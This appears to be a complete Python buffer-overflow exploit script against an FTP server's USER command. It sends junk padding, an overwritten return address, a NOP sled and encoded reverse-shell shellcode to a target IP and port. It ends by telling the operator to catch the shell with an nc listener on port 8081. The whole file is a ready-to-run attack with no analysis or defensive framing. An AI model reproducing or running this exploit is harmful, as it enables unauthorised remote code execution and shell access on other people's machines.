import socket
import sys

#asking user for input, makig sure target IP and port are entered
if len (sys.argv)<3:
	print ("[!]You need to enter the Target IP and Port")
	print ("[=]Example: %s 192.168.10.10 21"%sys.argv[0])
	sys.exit()
else:
	target_ip=sys.argv[1]
	target_port=int(sys.argv[2])

#connecting to the target
try:
	print("[+]Please wait as connection is established::::::::")
	print("[+]Connection Established")

	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	socket.setdefaulttimeout(15)
	s.connect((target_ip, target_port))

	print("[+]Receiving the Banner:::::::::::::::::")
	print(s.recv(1024))

except Exception as error:
	print ("[!]Connection Failed")
	sys.exit()

#create payload that will be sent to the target
junk1="\x46"*230
eip="\x03\x37\x3F\x77"
nops="\x90"*16
junk2="\x43"*16

#buf is created as a reverse shell.
buf =  ""
buf += "\x31\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81"
buf += "\x76\x0e\xad\x7b\x87\xd0\x83\xee\xfc\xe2\xf4\x51\x93"
buf += "\x05\xd0\xad\x7b\xe7\x59\x48\x4a\x47\xb4\x26\x2b\xb7"
buf += "\x5b\xff\x77\x0c\x82\xb9\xf0\xf5\xf8\xa2\xcc\xcd\xf6"
buf += "\x9c\x84\x2b\xec\xcc\x07\x85\xfc\x8d\xba\x48\xdd\xac"
buf += "\xbc\x65\x22\xff\x2c\x0c\x82\xbd\xf0\xcd\xec\x26\x37"
buf += "\x96\xa8\x4e\x33\x86\x01\xfc\xf0\xde\xf0\xac\xa8\x0c"
buf += "\x99\xb5\x98\xbd\x99\x26\x4f\x0c\xd1\x7b\x4a\x78\x7c"
buf += "\x6c\xb4\x8a\xd1\x6a\x43\x67\xa5\x5b\x78\xfa\x28\x96"
buf += "\x06\xa3\xa5\x49\x23\x0c\x88\x89\x7a\x54\xb6\x26\x77"
buf += "\xcc\x5b\xf5\x67\x86\x03\x26\x7f\x0c\xd1\x7d\xf2\xc3"
buf += "\xf4\x89\x20\xdc\xb1\xf4\x21\xd6\x2f\x4d\x24\xd8\x8a"
buf += "\x26\x69\x6c\x5d\xf0\x13\xb4\xe2\xad\x7b\xef\xa7\xde"
buf += "\x49\xd8\x84\xc5\x37\xf0\xf6\xaa\x84\x52\x68\x3d\x7a"
buf += "\x87\xd0\x84\xbf\xd3\x80\xc5\x52\x07\xbb\xad\x84\x52"
buf += "\x80\xfd\x2b\xd7\x90\xfd\x3b\xd7\xb8\x47\x74\x58\x30"
buf += "\x52\xae\x10\xba\xa8\x13\x47\x78\x95\x7a\xef\xd2\xad"
buf += "\x64\x16\x59\x4b\x11\x97\x86\xfa\x13\x1e\x75\xd9\x1a"
buf += "\x78\x05\x28\xbb\xf3\xdc\x52\x35\x8f\xa5\x41\x13\x77"
buf += "\x65\x0f\x2d\x78\x05\xc5\x18\xea\xb4\xad\xf2\x64\x87"
buf += "\xfa\x2c\xb6\x26\xc7\x69\xde\x86\x4f\x86\xe1\x17\xe9"
buf += "\x5f\xbb\xd1\xac\xf6\xc3\xf4\xbd\xbd\x87\x94\xf9\x2b"
buf += "\xd1\x86\xfb\x3d\xd1\x9e\xfb\x2d\xd4\x86\xc5\x02\x4b"
buf += "\xef\x2b\x84\x52\x59\x4d\x35\xd1\x96\x52\x4b\xef\xd8"
buf += "\x2a\x66\xe7\x2f\x78\xc0\x77\x65\x0f\x2d\xef\x76\x38"
buf += "\xc6\x1a\x2f\x78\x47\x81\xac\xa7\xfb\x7c\x30\xd8\x7e"
buf += "\x3c\x97\xbe\x09\xe8\xba\xad\x28\x78\x05"


#concatenate the payloads into one variable
username= junk1 + eip + nops + buf + junk2

#sending payload to the target
try:
	print("[+]Sending credentials::::::::::::::::")
	s.send("USER " + username + "\r\n")
	s.close()
except Exception as error:
	print("[!]Exploit Failed")
	sys.exit()

#Message showing successful connection.
print("[+]SUCCESS!!!")
print ("[+]Set up a listener to your attack machine on port 8081 to get a reverse shell to your target")
print ("[+]Example: nc -lvp 8081")